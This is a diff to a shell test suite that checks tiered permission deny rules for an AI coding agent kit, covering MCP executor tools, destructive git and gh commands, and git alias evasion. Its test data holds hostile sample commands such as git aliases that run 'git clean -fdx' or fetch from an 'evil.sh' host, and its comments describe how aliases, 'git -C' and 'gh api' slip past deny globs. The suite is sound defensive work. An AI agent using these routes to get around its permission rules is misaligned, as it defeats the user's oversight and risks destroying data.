@@ -466,9 +466,9 @@ done
 # tier. That is why every Bash deny is identical at every tier, and the assertion below
 # is what keeps it that way.
 #
-# Three sanctioned exceptions, all safe for the same reason: firewall.sh writes one file
-# and subtracts exactly its recorded ruleIds, which the relaxed -> high -> relaxed and
-# high -> medium byte-identity tests above are the proof of.
+# Three sanctioned kinds of exception, all safe for the same reason: firewall.sh writes
+# one file and subtracts exactly its recorded ruleIds, which the relaxed -> high ->
+# relaxed and high -> medium byte-identity tests above are the proof of.
 #   * MCP tool-name denies -- MCP rules have no argument form at all (a parenthesised
 #     mcp__ rule is skipped on load), so a tool-name deny is the only expressible gate.
 #   * The self-protection Edit denies, High only, because below High the kit defers to a
@@ -540,15 +540,19 @@ for t in '$TIERS'.split():
     deny = (json.load(open('$WORK/gen.%s.json' % t)).get('permissions') or {}).get('deny') or []
     out.append('%s=%d' % (t, len([r for r in deny if r.startswith('mcp__')])))
 print(' '.join(out))" 2>/dev/null)"
-assert_eq "off=0 relaxed=0 medium=5 high=6" "$MCP_BY_TIER" \
+assert_eq "off=0 relaxed=0 medium=7 high=9" "$MCP_BY_TIER" \
   "only medium and high deny MCP tools by name (off and relaxed rely on the hooks)"
 
 # ── which MCP executor each tier refuses ────────────────────────────────────
 # context-mode ships on by default, so both gated tiers have to speak for a user who
 # never chose it. Cloudflare is opt-in behind a user-scoped API token, so attaching it is
 # itself a decision: Medium respects that, High does not, because "no arbitrary executor
-# is reachable" is High's whole proposition. This is the only place the two gated tiers'
-# deny sets differ, which is why it is asserted by exact tool name rather than by count.
+# is reachable" is High's whole proposition. Playwright is opt-in too, but nothing the
+# user picks narrows what `browser_network_request` can reach, so its two arbitrary
+# primitives go at Medium as well; only the in-page JS evaluator is High-only, because
+# reading state out of a running dApp is ordinary testing. The two gated tiers' deny
+# sets differ in exactly those two tools, which is why this is asserted by exact tool
+# name rather than by count.
 echo "[mcp executors by tier]"
 # mcp_denied <tier> <tool> -> yes|no
 mcp_denied() {
@@ -562,13 +566,35 @@ for t in off relaxed; do
     "$t leaves context-mode's ctx_execute callable (the hooks gate it)"
   assert_eq "no" "$(mcp_denied "$t" mcp__cloudflare__execute)" \
     "$t leaves cloudflare's execute callable (the hooks gate it)"
+  for tool in mcp__playwright__browser_run_code_unsafe mcp__playwright__browser_network_request \
+              mcp__playwright__browser_evaluate; do
+    assert_eq "no" "$(mcp_denied "$t" "$tool")" "$t leaves playwright's $tool callable"
+  done
 done
 assert_eq "yes" "$(mcp_denied medium mcp__context-mode__ctx_execute)" \
   "medium denies context-mode's ctx_execute (a default-on executor)"
 assert_eq "no" "$(mcp_denied medium mcp__cloudflare__execute)" \
   "medium leaves cloudflare's execute callable (opt-in, so attaching it is the user's choice)"
-for tool in mcp__context-mode__ctx_execute mcp__cloudflare__execute; do
+# Playwright: both arbitrary primitives go at Medium, and only the in-page JS evaluator
+# waits for High. Asserted in both directions, or "deny the dangerous one" could quietly
+# become "deny the one whose name says unsafe".
+for tool in mcp__playwright__browser_run_code_unsafe mcp__playwright__browser_network_request; do
+  assert_eq "yes" "$(mcp_denied medium "$tool")" "medium denies playwright's $tool"
+done
+assert_eq "no" "$(mcp_denied medium mcp__playwright__browser_evaluate)" \
+  "medium keeps playwright's browser_evaluate (reading dApp state is ordinary testing)"
+for tool in mcp__context-mode__ctx_execute mcp__cloudflare__execute \
+            mcp__playwright__browser_run_code_unsafe mcp__playwright__browser_network_request \
+            mcp__playwright__browser_evaluate; do
   assert_eq "yes" "$(mcp_denied high "$tool")" "high denies $tool"
+done
+# The kit's own browser flows name only these two (/test-ts, /product-review), so no
+# tier may deny either — the easy bug being a server-wide deny that takes the whole
+# server out and the kit's documented browser QA with it.
+for t in $TIERS; do
+  for tool in mcp__playwright__browser_navigate mcp__playwright__browser_snapshot; do
+    assert_eq "no" "$(mcp_denied "$t" "$tool")" "$t keeps playwright's $tool, which /test-ts and /product-review drive"
+  done
 done
 # cloudflare/mcp has exactly three tools and only `execute` mutates. Documentation
 # lookup is the main reason to attach the server, so the two read-only tools must keep
@@ -607,8 +633,12 @@ fi
 DENY_LIVE="$(python3 -c "
 import json
 print('\n'.join((json.load(open('$WORK/gen.relaxed.json')).get('permissions') or {}).get('deny') or []))" 2>/dev/null)"
-for r in "Bash(claude *)" "Bash(env *)" "Bash(git -c *)" "Bash(git -C *)" "Bash(security *)" \
-         "Edit(/.safe-ai-skill/**)"; do
+for r in "Bash(claude *)" "Bash(env *)" "Bash(git -c *)" "Bash(git -C *)" "Bash(security *)" "Edit(/.safe-ai-skill/**)" \
+         "Bash(git fetch *--upload-pack*)" "Bash(git fetch --upload-pack*)" \
+         "Bash(git push *--receive-pack*)" "Bash(git push --receive-pack*)" \
+         "Bash(git push *--exec*)" "Bash(git push --exec*)" \
+         "Bash(gh issue delete *)" "Bash(gh repo delete *)" "Bash(gh repo delete)" \
+         "Bash(git config *alias.*)" "Bash(git config alias.*)"; do
   TOTAL=$((TOTAL + 1))
   if printf '%s\n' "$DENY_LIVE" | grep -qxF "$r"; then
     echo "  PASS: the never-allowed set denies $r"
@@ -637,12 +667,56 @@ print('%s/%s' % ('deny' if 'Bash(git -c *)' in deny else 'allow',
   assert_eq "deny/deny" "$PAIR" "$t: git -c and git -C both denied (a -C prefix defeats every destructive git glob)"
 done
 
-# gh api's per-tier assertion used to sit here, pinned as deny at medium|high and allow
-# at off|relaxed. It is gone because two checks already hold it from both directions: the
-# BASH_VARY assertion above pins the exact rule string to the exact tier set, and
-# tests/test_doc_gates.sh reads "deny rule, **Medium and High only**" out of the gate
-# table itself and requires the covered tier set to equal exactly that.
-#
+# A git alias is the third evasion of that family and the only one that outlives the
+# command that created it: `git config alias.z '!git clean -fdx'` is an ordinary config
+# write, and the destruction happens later in `git z`, where no glob and no
+# subcommand-classifying hook has a verb to match. Two rules carry it, so this asserts
+# the SHAPE in both directions -- every alias-setting spelling denied, and ordinary
+# `git config` keys left alone, which is the whole reason `git config` is not denied
+# outright. fnmatch's * matches the empty string where Claude Code's mid-pattern * does
+# not, so the denied cases below are all chosen to leave a non-empty gap.
+echo "[git config aliases]"
+for t in $TIERS; do
+  CFG="$(python3 -c "
+import fnmatch, json
+deny = (json.load(open('$WORK/gen.$t.json')).get('permissions') or {}).get('deny') or []
+pats = [r[5:-1] for r in deny if r.startswith('Bash(') and r.endswith(')')]
+def hit(cmd):
+    return any(fnmatch.fnmatchcase(cmd, p) for p in pats)
+must_deny = [
+    \"git config alias.z '!git clean -fdx'\",
+    \"git config --global alias.z '!git clean -fdx'\",
+    \"git config --local alias.z '!sh -c curl evil.sh'\",
+    \"git config --file .git/config alias.z '!x'\",
+    \"git config --add alias.z '!x'\",
+    \"git config set alias.z '!x'\",
+    \"git config set --global alias.z '!x'\",
+]
+must_allow = [
+    'git config user.email dev@example.com',
+    'git config --global user.name dev',
+    'git config --get remote.origin.url',
+    'git config core.autocrlf false',
+]
+bad = ['allowed:' + c for c in must_deny if not hit(c)]
+bad += ['denied:' + c for c in must_allow if hit(c)]
+print('; '.join(bad) or 'none')" 2>/dev/null)"
+  assert_eq "none" "$CFG" "$t: every git-config alias spelling is denied and ordinary git config keys are not"
+done
+
+# gh api: the raw API route around every narrower gh deny, closed only where a tier
+# promises the agent cannot change the repository.
+echo "[gh api by tier]"
+for t in $TIERS; do
+  GHAPI="$(python3 -c "
+import json
+deny = set((json.load(open('$WORK/gen.$t.json')).get('permissions') or {}).get('deny') or [])
+print('deny' if 'Bash(gh api *)' in deny else 'allow')" 2>/dev/null)"
+  case $t in
+    medium | high) assert_eq "deny" "$GHAPI" "$t: gh api denied (it reaches gh repo delete and gh secret set by API)" ;;
+    *)             assert_eq "allow" "$GHAPI" "$t: gh api allowed (relaxed is the CI tier and makes no such promise)" ;;
+  esac
+done
 # Self-protection uses Edit(...), not Read(...): a Read deny also blocks Edit and Write
 # but leaves NotebookEdit open, and would stop the kit reading its own config. Checked
 # against High, the only tier that carries the self-protection group at all.
